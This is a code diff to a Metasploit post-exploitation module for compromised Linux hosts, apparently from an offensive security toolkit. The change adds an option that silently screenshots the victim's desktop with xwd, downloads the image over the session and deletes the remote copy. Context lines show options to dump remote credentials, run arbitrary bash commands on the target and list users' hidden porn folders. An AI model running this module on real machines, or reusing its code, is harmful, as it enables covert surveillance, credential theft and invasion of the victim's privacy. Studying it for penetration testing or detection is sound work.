@@ -27,6 +27,7 @@
 # Dump remote credentials from target?         => set CREDENTIALS_DUMP true
 # list hidden folders/pics/vids porn related?' => set THE_FAPENNING true
 # The bash command to execute remotly          => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
+# Take a screenshot of remote desktop?         => set SCREEN_CAPTURE true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -100,7 +101,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
                                 ],
  
-                        'Version'        => '$Revision: 1.5',
+                        'Version'        => '$Revision: 1.6',
                         'DisclosureDate' => '10 20 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -133,6 +134,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptBool.new('SCREEN_CAPTURE', [false, 'Take a screenshot of remote desktop?', false]),
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Run agressive system fingerprints scans?', false]),
                                 OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target system?', false]),
                                 OptBool.new('THE_FAPENNING', [false, 'list hidden folders/pics/vids porn related?', false]),
@@ -201,7 +203,7 @@ def run
       # Dump system information from target (fingerprints)
       #
       data_dump=''
-      print_status("Executing list of commands remotely ..")
+      print_status("Executing list of commands remotely.")
       Rex::sleep(0.2)
       #
       # bash commands to be executed remotely ..
@@ -241,7 +243,7 @@ def run
         # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
-        print_status("Storing scan results into msf database ..")
+        print_status("Storing scan results into msf database.")
         Rex::sleep(0.7)
         data_dump << "\n\n"
         data_dump << "linux_hostrecon logfile\n"
@@ -317,7 +319,7 @@ def run
         # if sellected previous in advanced options (set AGRESSIVE_DUMP true) ..
         #
         if datastore['AGRESSIVE_DUMP'] == true
-          print_status("Running agressive fingerprint modules ..")
+          print_status("Running agressive fingerprint modules.")
           Rex::sleep(0.5)
           #
           # bash commands to be executed remotely ..
@@ -341,7 +343,7 @@ def run
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            print_status("Storing scan results into msf database ..")
+            print_status("Storing scan results into msf database.")
             Rex::sleep(0.7)
             data_dump << "+--------------------------+\n"
             data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
@@ -414,7 +416,7 @@ def run
         # if sellected previous in advanced options (set CREDENTIALS_DUMP true) ..
         #
         if datastore['CREDENTIALS_DUMP'] == true
-          print_status("Dumping remote credentials from target ..")
+          print_status("Dumping remote credentials from target.")
           Rex::sleep(0.2)
           #
           # bash commands to be executed remotely ..
@@ -435,7 +437,7 @@ def run
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            print_status("Storing scan results into msf database ..")
+            print_status("Storing scan results into msf database.")
             Rex::sleep(0.7)
             data_dump << "+--------------------------+\n"
             data_dump << "|  REMOTE CREDENTIALS DUMP |\n"
@@ -478,7 +480,7 @@ def run
     # if sellected previous in advanced options (set THE_FAPENNING true) ..
     #
     if datastore['THE_FAPENNING'] == true
-      print_status("List remote hidden porn folders/files ..")
+      print_status("List remote hidden porn folders/files.")
       Rex::sleep(0.5)
       #
       # bash commands to be executed remotely ..
@@ -494,7 +496,7 @@ def run
         # store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
-        print_status("Storing scan results into msf database ..")
+        print_status("Storing scan results into msf database.")
         Rex::sleep(0.7)
         data_dump << "+--------------------------------+\n"
         data_dump << "|         THE FAPENNING          |\n"
@@ -523,7 +525,7 @@ def run
         exec_bash = datastore['SINGLE_COMMAND']
         # check if single_command option its configurated ..
         if not exec_bash.nil?
-          print_status("Executing user inputed bash command ..")
+          print_status("Executing user inputed bash command.")
           Rex::sleep(0.5)
           # bash command to be executed remotely ..
           single_comm = cmd_exec("#{exec_bash}")
@@ -531,7 +533,7 @@ def run
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            print_status("Storing scan results into msf database ..")
+            print_status("Storing scan results into msf database.")
             Rex::sleep(0.7)
             data_dump << "+--------------------------------+\n"
             data_dump << "|    COMMAND EXECUTED REMOTELY   |\n"
@@ -547,11 +549,29 @@ def run
        # All scans finished ..
        # Displaying results on screen (data_dump) ..
        #
-       print_good("Remote scans completed, building list ..")
+       print_good("Remote scans completed, building list.")
        Rex::sleep(2.3)
        # print the contents of (data_dump) local variable on screen ..
        print_line(data_dump)
        Rex::sleep(0.2)
+
+
+
+     #
+     # mitre ATT&CK T1113 - Screen capture (remote desktop)
+     #
+     if datastore['SCREEN_CAPTURE'] == true
+       print_status("Taking a screenshot of: #{sys_info['Computer']}")
+       cmd_exec("xwd -root -out /tmp/ScreenShot.xwd")
+       Rex::sleep(1)
+       # download remote file
+       client.fs.file.download("/root/ScreenShot.xwd","/tmp/ScreenShot.xwd")
+       print_status("ScreenShot stored in: /root/ScreenShot.xwd")
+       print_status("To view screenshot use: xwud -in /root/ScreenShot.xwd")
+       Rex::sleep(1)
+       # delete remote file
+       client.fs.file.rm("/tmp/ScreenShot.xwd")
+     end
 
 
 
